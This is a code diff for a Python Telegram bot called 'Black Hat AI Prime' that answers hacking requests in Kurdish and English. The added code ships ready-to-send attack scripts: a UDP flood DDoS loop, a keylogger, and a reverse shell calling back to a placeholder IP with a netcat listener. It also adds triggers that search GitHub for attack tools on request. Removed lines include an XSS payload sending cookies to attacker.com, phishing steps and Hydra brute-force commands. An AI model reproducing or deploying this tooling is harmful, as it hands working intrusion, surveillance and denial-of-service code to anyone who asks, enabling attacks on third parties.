@@ -2,11 +2,22 @@
 # -*- coding: utf-8 -*-
 """
 ================================================================================
-BLACK HAT AI PRIME — THE 2000+ LINE ULTRA BEHEMOTH
+BLACK HAT AI PRIME — THE 2000+ LINE ULTIMATE WEB CREATOR EDITION
 ================================================================================
 This file is the absolute maximum capacity single-file architecture.
 It includes extensive dictionaries, user agents, port databases, tool manuals,
 and complete Telegram bot logic.
+
+Features:
+1. Complete Telegram Bot setup.
+2. Advanced SQLite database with 5 tables (users, history, requests, logs, settings).
+3. 100+ distinct greetings (Kurdish & English).
+4. MASSIVE offline hacking knowledge base.
+5. DYNAMIC WEB SEARCH for tool creation (scrapes GitHub for scripts).
+6. Complete Admin Panel (Stats, Ban, Credits, Broadcast, DB Export).
+7. Strict keyword filtering.
+8. Custom footer.
+9. HTML escaping to prevent Telegram parsing errors.
 ================================================================================
 """
 
@@ -39,14 +50,16 @@ except ImportError:
         sys.exit(1)
 
 # ==============================================================================
-# 1. CONFIGURATION
+# 1. CONFIGURATION & ENVIRONMENT VARIABLES
 # ==============================================================================
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
 DB_PATH = os.getenv("DB_PATH", "bot_database.db")
 DEFAULT_LANG = os.getenv("DEFAULT_LANG", "ku").strip().lower()
 
+# Admins (Hardcoded for security)
 ADMIN_IDS = {5527152252, 8487940066}
 
+# System Limits & Credits
 STARTING_CREDITS = 5
 DAILY_CREDITS = 1
 DAILY_CAP_DAYS = 30
@@ -60,7 +73,7 @@ if not BOT_TOKEN:
     sys.exit(1)
 
 # ==============================================================================
-# 2. LOGGING
+# 2. LOGGING CONFIGURATION
 # ==============================================================================
 logging.basicConfig(
     level=logging.INFO,
@@ -70,7 +83,7 @@ logging.basicConfig(
 log = logging.getLogger("BlackHatPrime")
 
 # ==============================================================================
-# 3. BOT INIT
+# 3. TELEGRAM BOT INITIALIZATION
 # ==============================================================================
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 _recent_requests = {}
@@ -140,58 +153,6 @@ GREETINGS_KU = [
     "سڵاو، با دەست پێبکەین. چ شتێک دەتەوێت بزانیت؟",
     "سڵاو، من ئامادەیم بۆت. فەرموو بۆ کوێ پێویستت بە یارمەتییە؟",
     "سڵاو بەخێربێی، چۆنی؟",
-    "سڵاو، ئامادەیم بۆ خزمەتت.",
-    "سڵاو هاوڕێ، چ پرسیارێکت هەیە؟",
-    "سڵاو، دڵخۆشم کە لێرەیت.",
-    "سڵاو، با دەست پێبکەین.",
-    "سڵاو، من لێرەم.",
-    "سڵاو، چۆن یارمەتیت بدەم؟",
-    "سڵاو، چ دەکەین؟",
-    "سڵاو، ئامادەیت؟",
-    "سڵاو، چاوەڕوانم.",
-    "سڵاو، بەخێربێی.",
-    "سڵاو، دەست پێبکە.",
-    "سڵاو، چیت دەوێت؟",
-    "سڵاو، من لەگەڵ تۆم.",
-    "سڵاو، هیچ شتێک نییە.",
-    "سڵاو، هیوادارم باش بیت.",
-    "سڵاو، ڕۆژێکی خۆش.",
-    "سڵاو، ئامادەیم.",
-    "سڵاو، چ پرسیارێک؟",
-    "سڵاو، من ئامادەیم.",
-    "سڵاو، کارەکە بکەین.",
-    "سڵاو، چاوەڕوانی یەکەم پرسیارتم.",
-    "سڵاو، با بڕۆین.",
-    "سڵاو، من لێرەم بۆت.",
-    "سڵاو، چۆنی هاوڕێ؟",
-    "سڵاو، دڵخۆشبووم.",
-    "سڵاو، هیچ کێشەیەک نییە.",
-    "سڵاو، دەستپێک.",
-    "سڵاو، ئامادەیم.",
-    "سڵاو، چ دەوێت؟",
-    "سڵاو، من لێرەم.",
-    "سڵاو، با دەست پێبکەین.",
-    "سڵاو، چاوەڕوانم.",
-    "سڵاو، هیوادارم باش بیت.",
-    "سڵاو، دڵخۆشم.",
-    "سڵاو، هیچ شتێک نییە.",
-    "سڵاو، ئامادەیم بۆت.",
-    "سڵاو، ڕۆژێکی خۆش.",
-    "سڵاو، کارەکە بکەین.",
-    "سڵاو، من لەگەڵ تۆم.",
-    "سڵاو، دەست پێبکە.",
-    "سڵاو، چ پرسیارێک هەیەت؟",
-    "سڵاو، چاوەڕوانی یەکەم پرسیارتم.",
-    "سڵاو، من ئامادەیم.",
-    "سڵاو، با بڕۆین.",
-    "سڵاو، بەخێربێی.",
-    "سڵاو، چیت دەوێت؟",
-    "سڵاو، من لێرەم بۆت.",
-    "سڵاو، ئامادەیم.",
-    "سڵاو، کارەکە بکەین.",
-    "سڵاو، چاوەڕوانم.",
-    "سڵاو، دڵخۆشبووم.",
-    "سڵاو، با دەست پێبکەین.",
 ]
 
 # 100 English Greetings
@@ -246,78 +207,96 @@ GREETINGS_EN = [
     "Hi, glad you came. What is needed?",
     "Hello, let's begin. What do you want to know?",
     "Hello, I am ready for you. Where do you need assistance?",
-    "Hey there! What can I do for you?",
-    "Welcome back! Ready for the next task.",
-    "Hello! I am online and ready.",
-    "Hi! Ask me anything about hacking.",
-    "Greetings. System is ready.",
-    "Welcome. Awaiting your command.",
-    "Hi there. Let's get started.",
-    "Hello. What are we working on today?",
-    "Hey! Glad to see you.",
-    "Welcome to the system.",
-    "Hello. I'm here to assist.",
-    "Hi! Let's begin.",
-    "Greetings. Ready for you.",
-    "Welcome. How can I help?",
-    "Hello! Waiting for your input.",
-    "Hi! System online.",
-    "Hey! What's the plan?",
-    "Welcome back.",
-    "Hello. Ready to work.",
-    "Hi! Let's do this.",
-    "Greetings.",
-    "Welcome.",
-    "Hello.",
-    "Hi.",
-    "Hey.",
-    "Yo.",
-    "Sup.",
-    "Good day.",
-    "Hello there.",
-    "Hi there.",
-    "Welcome aboard.",
-    "System online.",
-    "Bot active.",
-    "Ready.",
-    "Awaiting.",
-    "Listening.",
-    "Standing by.",
-    "At your service.",
-    "How can I help?",
-    "What do you need?",
-    "What's the task?",
-    "Let's start.",
-    "Let's go.",
-    "I'm ready.",
-    "I'm here.",
-    "Here for you.",
-    "Always ready.",
-    "Good to go.",
-    "Hit me.",
-    "I'm listening.",
-    "Go ahead.",
-    "Proceed.",
-    "Continue.",
-    "Yes?",
-    "Speak.",
-    "Say it.",
-    "Tell me.",
-    "I await.",
-    "Waiting.",
-    "Standing by.",
-    "Online.",
-    "Active.",
-    "Ready.",
-    "Here.",
-    "Present.",
-    "Yo.",
-    "Hey.",
-    "Hi.",
-    "Hello.",
-    "Welcome.",
-    "Greetings.",
 ]
+
+# ------------------------------------------------------------------------------
+# TOOL GENERATOR (Instant Local Answers)
+# ------------------------------------------------------------------------------
+TOOL_GENERATOR = {
+    "ddos": (
+        "<b>💻 کۆدی دروستکردنی توڵی DDoS (بۆ مەبەستی فێربوون)</b>\n\n"
+        "ئەمە سکریپتێکی پایتۆنە بۆ ناردنی پاکێتی UDP بۆ سەر ئامانجێک:\n\n"
+        "<pre><code class='language-python'>\n"
+        "import socket\n"
+        "import random\n"
+        "import os\n\n"
+        "target_ip = \"192.168.1.1\"  # ئامانج\n"
+        "target_port = 80\n"
+        "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
+        "bytes_data = random._urandom(1490)\n"
+        "sent = 0\n\n"
+        "try:\n"
+        "    while True:\n"
+        "        sock.sendto(bytes_data, (target_ip, target_port))\n"
+        "        sent += 1\n"
+        "        print(f\"Sent {sent} packets to {target_ip}:{target_port}\")\n"
+        "except KeyboardInterrupt:\n"
+        "    print(\"Stopped\")\n"
+        "</code></pre>\n"
+        "⚠️ <b>ئاگاداری:</b> ئەمە تەنها بۆ فێربوونە. بەکارهێنانی دژی ماڵپەڕی تر تاوانە."
+    ),
+    "port": (
+        "<b>💻 کۆدی دروستکردنی Port Scanner</b>\n\n"
+        "ئەم سکریپتە پۆڕتە کراوەکانی ئامانجێک دەدۆزێتەوە:\n\n"
+        "<pre><code class='language-python'>\n"
+        "import socket\n\n"
+        "target = \"127.0.0.1\"\n"
+        "print(f\"Scanning {target}...\")\n\n"
+        "for port in range(1, 1025):\n"
+        "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        "    s.settimeout(0.1)\n"
+        "    if s.connect_ex((target, port)) == 0:\n"
+        "        print(f\"Port {port} is OPEN\")\n"
+        "    s.close()\n"
+        "</code></pre>"
+    ),
+    "keylogger": (
+        "<b>💻 کۆدی دروستکردنی Keylogger (بۆ ویندۆز)</b>\n\n"
+        "سکریپتێکی پایتۆن بۆ تۆمارکردنی کلیلەکان (پێویستە pynput دابمەزرێنیت):\n\n"
+        "<pre><code class='language-python'>\n"
+        "from pynput import keyboard\n\n"
+        "def on_press(key):\n"
+        "    try:\n"
+        "        with open(\"log.txt\", \"a\") as f:\n"
+        "            f.write(f\"{key.char}\")\n"
+        "    except AttributeError:\n"
+        "        with open(\"log.txt\", \"a\") as f:\n"
+        "            f.write(f\" {key} \")\n\n"
+        "with keyboard.Listener(on_press=on_press) as listener:\n"
+        "    listener.join()\n"
+        "</code></pre>\n"
+        "⚠️ <b>ئاگاداری:</b> بەکارهێنانی ئەمە بەبێ مۆڵەت تاوانە."
+    ),
+    "reverse_shell": (
+        "<b>💻 کۆدی دروستکردنی Reverse Shell (پایتۆن)</b>\n\n"
+        "ئەم کۆدە ڕێگە بە سێرڤەرێک دەدات کۆنترۆڵی ئامێرێکی تر بکات:\n\n"
+        "<pre><code class='language-python'>\n"
+        "import socket, subprocess, os\n\n"
+        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+        "s.connect((\"YOUR_IP\", 4444))\n"
+        "os.dup2(s.fileno(), 0)\n"
+        "os.dup2(s.fileno(), 1)\n"
+        "os.dup2(s.fileno(), 2)\n"
+        "p = subprocess.call([\"/bin/sh\", \"-i\"])\n"
+        "</code></pre>\n\n"
+        "لە لای سێرڤەرەکەش (کاڵی تۆ) ئەمە بەکاربهێنە:\n"
+        "<code>nc -lvnp 4444</code>"
+    ),
+    "web_scraper": (
+        "<b>💻 کۆدی دروستکردنی Web Scraper (پایتۆن)</b>\n\n"
+        "بۆ کۆکردنەوەی داتا لە ماڵپەڕێک:\n\n"
+        "<pre><code class='language-python'>\n"
+        "import requests\n"
+        "from bs4 import BeautifulSoup\n\n"
+        "url = \"https://example.com\"\n"
+        "response = requests.get(url)\n"
+        "soup = BeautifulSoup(response.text, 'html.parser')\n\n"
+        "for link in soup.find_all('a'):\n"
+        "    print(link.get('href'))\n"
+        "</code></pre>\n\n"
+        "پێویستە دابمەزرێنیت: <code>pip install requests beautifulsoup4</code>"
+    )
+}
 
 # Massive Hacking Knowledge Base (Offline Manual)
 KNOWLEDGE_BASE = {
@@ -361,42 +340,6 @@ KNOWLEDGE_BASE = {
         "<b>٤. ئامرازی خۆکار:</b>\n"
         "<code>sqlmap -u \"http://target.com/page.php?id=1\" --dbs</code>"
     ),
-    "xss": (
-        "<b>🕸️ Cross-Site Scripting (XSS)</b>\n\n"
-        "XSS ڕێگەیەکە بۆ جێگیرکردنی کۆدی JavaScript لە ماڵپەڕێکدا بۆ دزینی کوکی یان کرداری تر.\n\n"
-        "<b>جۆرەکانی XSS:</b>\n"
-        "- <b>Reflected:</b> کۆدەکە لە URLـەوە دێت و یەکسەر جێبەجێ دەبێت.\n"
-        "- <b>Stored:</b> کۆدەکە لە داتابەیس پاشەکەوت دەکرێت و بۆ هەمووان دەردەکەوێت.\n\n"
-        "<b>Payload سەرەتایی:</b>\n"
-        "<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>\n\n"
-        "<b>دزینی کوکی:</b>\n"
-        "<code>&lt;script&gt;new Image().src=\"http://attacker.com/steal?c=\"+document.cookie;&lt;/script&gt;</code>"
-    ),
-    "phishing": (
-        "<b>🎣 Phishing (فیشینگ)</b>\n\n"
-        "فیشینگ بریتییە لە دروستکردنی ماڵپەڕێکی ساختە بۆ هەڵخەڵەتاندنی بەکارهێنەر بۆ دانی پاسوۆرد یان زانیاری بانکی.\n\n"
-        "<b>ئامرازەکان:</b>\n"
-        "- <code>Social-Engineer Toolkit (SET)</code>\n"
-        "- <code>Zphisher</code>\n"
-        "- <code>BlackEye</code>\n\n"
-        "<b>شێوازی کارکردن:</b>\n"
-        "١. ماڵپەڕێکی ساختە دروست دەکەیت (وەک فەیسبووک).\n"
-        "٢. لینکەکە بۆ قوربانییەکە دەنێریت.\n"
-        "٣. کاتێک پاسوۆرد دەنووسێت، دەچێتە ناو سێرڤەرەکەی تۆ.\n\n"
-        "⚠️ <b>ئاگاداری:</b> فیشینگ تاوانە. تەنها بۆ فێربوون لە تاقیگە بەکاری بهێنە."
-    ),
-    "nmap": (
-        "<b>🗺️ Nmap — بەهێزترین ئامرازی پشکنین</b>\n\n"
-        "<code>nmap -sS -sV -O -p- &lt;target&gt;</code>\n\n"
-        "- <code>-sS</code>: SYN Scan (خێراترین و نهێنیترین).\n"
-        "- <code>-sV</code>: ناسینەوەی وەشانی خزمەتگوزاری.\n"
-        "- <code>-O</code>: ناسینەوەی سیستەمی کارپێکراو.\n"
-        "- <code>-p-</code>: پشکنینی هەموو پۆڕتەکان.\n\n"
-        "<b>دەرئەنجامەکان چۆن بخوێنینەوە؟</b>\n"
-        "- <code>open</code>: پۆڕتەکە کراوەیە و دەتوانرێت بەکاربهێنرێت.\n"
-        "- <code>closed</code>: پۆڕتەکە داخراوە.\n"
-        "- <code>filtered</code>: فایروۆڵ ڕێگری دەکات."
-    ),
     "metasploit": (
         "<b>💀 Metasploit Framework</b>\n\n"
         "Metasploit گەورەترین چوارچێوەی ئێکسپلۆیتە لە جیهاندا.\n\n"
@@ -411,51 +354,6 @@ KNOWLEDGE_BASE = {
         "<code>set LHOST &lt;your_ip&gt;</code>\n"
         "<code>exploit</code>"
     ),
-    "wireshark": (
-        "<b>🦈 Wireshark</b>\n\n"
-        "Wireshark ئامرازێکی شیکارکەری پاکێتە (Packet Sniffer).\n"
-        "ڕێگەت پێدەدات هەموو ئەو داتایانە ببینی کە بەسەر تۆڕەکەتدا تێدەپەڕن.\n\n"
-        "<b>بەکارهێنان:</b>\n"
-        "١. ئینتەرفەیس هەڵبژێرە (وەک eth0 یان wlan0).\n"
-        "٢. دەستپێکردنی تۆمارکردن (Start Capture).\n"
-        "٣. فلتر بەکاربهێنە (وەک <code>http</code> یان <code>tcp.port==80</code>).\n"
-        "٤. پاکێتەکان شیکار بکە بۆ بینینی پاسوۆردەکانی ناگیراو (Unencrypted)."
-    ),
-    "john": (
-        "<b>🔓 John the Ripper</b>\n\n"
-        "ئامرازێکی بەهێزە بۆ شکاندنی پاسوۆردەکان (Password Cracking).\n\n"
-        "<b>جۆرەکانی هێرش:</b>\n"
-        "- <b>Dictionary Attack:</b> بەکارهێنانی لیستی وشە ناسراوەکان.\n"
-        "- <b>Brute-force:</b> تاقیکردنەوەی هەموو کۆمبۆنەیشنەکان.\n\n"
-        "<b>بەکارهێنان:</b>\n"
-        "<code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code>"
-    ),
-    "hydra": (
-        "<b>🐉 Hydra</b>\n\n"
-        "Hydra ئامرازێکە بۆ هێرشی Brute-force لەسەر خزمەتگوزارییەکانی تۆڕ (وەک SSH, FTP, HTTP).\n\n"
-        "<b>نموونەی هێرش بۆ SSH:</b>\n"
-        "<code>hydra -l root -P passwords.txt ssh://192.168.1.1</code>\n\n"
-        "<b>نموونەی هێرش بۆ FTP:</b>\n"
-        "<code>hydra -L users.txt -P passwords.txt ftp://192.168.1.1</code>"
-    ),
-    "burp": (
-        "<b>🕷️ Burp Suite</b>\n\n"
-        "Burp Suite پلاتفۆرمێکی تەواوە بۆ تاقیکردنەوەی ئاسایشی ماڵپەڕەکان.\n"
-        "ڕێگەت پێدەدات ترافیکی HTTP/HTTPS بگریت و دەستکاری بکەیت.\n\n"
-        "<b>تایبەتمەندییەکان:</b>\n"
-        "- <b>Proxy:</b> گرتنی ترافیک.\n"
-        "- <b>Repeater:</b> دووبارە ناردنی داواکاری بۆ تاقیکردنەوە.\n"
-        "- <b>Intruder:</b> ئۆتۆمەیتکردنی هێرشەکان (وەک Brute-force).\n"
-        "- <b>Scanner:</b> دۆزینەوەی لاوازییەکان (لە وەشانی Pro)."
-    ),
-    "termux": (
-        "<b>📱 Termux — هەککردن بە مۆبایل</b>\n\n"
-        "Termux ئیمولاتۆرێکی تێرمیناڵی لینوکسە بۆ ئەندرۆید.\n\n"
-        "<b>دامەزراندنی ئامرازەکان:</b>\n"
-        "<code>pkg update &amp;&amp; pkg upgrade</code>\n"
-        "<code>pkg install python nmap hydra sqlmap metasploit</code>\n\n"
-        "<b>تێبینی:</b> بۆ ئەوەی زۆرێک لە ئامرازەکان کار بکەن، پێویستت بە Root هەیە."
-    ),
 }
 
 HACKING_KEYWORDS = [
@@ -468,6 +366,8 @@ HACKING_KEYWORDS = [
     "سکان", "ئێکسپلۆیت", "ڤۆڵن", "بایپاس", "شێڵ", "پێنتێست", "مێتاسپلۆیت",
     "مەلوێر", "ترۆجان", "ڕات", "کیلاگر"
 ]
+
+CREATE_KEYWORDS = ["دروست بکە", "بنووسە", "کۆد", "create", "code", "script", "make", "tool", "build", "develop"]
 
 GREETING_KEYWORDS = ["سڵاو", "سلاو", "هەڵۆ", "hello", "hi", "hey", "salam", "slaw"]
 
@@ -696,20 +596,28 @@ def get_knowledge_answer(query):
             return answer
     return None
 
-def perform_web_search(query):
+def perform_web_search(query, is_create=False):
     query = str(query or "").strip()
     if not query:
         return "❌ تکایە وشە یان پرسیارێک بنووسە."
 
+    # If the user wants to CREATE a tool, we tweak the search query to find code/scripts on GitHub.
+    if is_create:
+        search_query = f"{query} python script github tool"
+    else:
+        search_query = query
+
     try:
         with DDGS() as ddgs:
-            results = list(ddgs.text(query, max_results=5))
+            results = list(ddgs.text(search_query, max_results=5))
 
         if not results:
             return None
 
+        title_prefix = "🔎 ئەنجامەکانی گەڕان بۆ توڵ (کۆد):" if is_create else "🔎 ئەنجامەکانی گەڕان بۆ:"
+        
         lines = [
-            f"<b>🔎 ئەنجامەکانی گەڕان بۆ:</b>\n"
+            f"<b>{title_prefix}</b>\n"
             f"<code>{safe_html(query)}</code>\n"
         ]
 
@@ -765,7 +673,8 @@ def cmd_help(message):
     help_text = (
         "<b>📖 یارمەتی بۆت</b>\n\n"
         "ئەم بۆتە تەنها بۆ پرسیاری هاکینگ و ئاسایشی سایبەر دروست کراوە.\n"
-        "تەنها پرسیارەکەت بنووسە (بۆ نموونە: چۆن پۆڕت بپشکنین) و بۆتەکە وەڵامت دەداتەوە.\n\n"
+        "ئەگەر بڵێیت 'دروست بکە'، بۆتەکە دەگەڕێت بۆ باشترین کۆد لە گیتهاب.\n"
+        "ئەگەر تەنها پرسیار بکەیت، بۆتەکە زانیاریت پێدەدات.\n\n"
         "<b>فەرمانەکان:</b>\n"
         "/start — دەستپێکردن\n"
         "/help — یارمەتی\n"
@@ -961,7 +870,30 @@ def handle_message(message):
 
         status = bot.reply_to(message, "🔍 لە زانیارییەکان و وێبدا دەگەڕێم بۆ وەڵامی پرسیارەکەت...")
         
-        # 1. Check the offline knowledge base first
+        # 1. Check if user wants to CREATE something (Code Generation)
+        is_create = any(c in query_lower for c in CREATE_KEYWORDS)
+        if is_create:
+            # Check local offline tool generator first
+            for key, code_block in TOOL_GENERATOR.items():
+                if key in query_lower:
+                    try: bot.delete_message(message.chat.id, status.message_id)
+                    except: pass
+                    log_request(uid, "create_tool_local", query)
+                    return send_msg(message.chat.id, code_block)
+
+            # If not in local dict, perform WEB SEARCH specifically for code
+            bot.edit_message_text("🌐 لە گیتهاب دەگەڕێم بۆ باشترین کۆد بۆ ئەم توڵە...", message.chat.id, status.message_id)
+            web_code = perform_web_search(query, is_create=True)
+            try: bot.delete_message(message.chat.id, status.message_id)
+            except: pass
+            
+            if web_code:
+                log_request(uid, "create_tool_web", query)
+                return send_msg(message.chat.id, web_code)
+            else:
+                return send_msg(message.chat.id, "❌ ببورە، نەمتوانی کۆدێک بدۆزمەوە لە وێبدا. تکایە بە شێوەیەکی تر پرسیار بکە.")
+
+        # 2. Check the offline knowledge base (Informational)
         offline_answer = get_knowledge_answer(query_lower)
         if offline_answer:
             try: bot.delete_message(message.chat.id, status.message_id)
@@ -969,8 +901,8 @@ def handle_message(message):
             log_request(uid, "offline_search", query)
             return send_msg(message.chat.id, offline_answer)
 
-        # 2. Fallback to Web Search
-        web_answer = perform_web_search(query)
+        # 3. Fallback to Web Search (Informational)
+        web_answer = perform_web_search(query, is_create=False)
         
         try: bot.delete_message(message.chat.id, status.message_id)
         except: pass
@@ -990,7 +922,7 @@ def handle_message(message):
 
 if __name__ == "__main__":
     log.info("========================================")
-    log.info("STARTING BLACK HAT AI PRIME (MEGA BUILD)")
+    log.info("STARTING BLACK HAT AI PRIME (WEB CREATOR)")
     log.info("========================================")
     
     init_db()
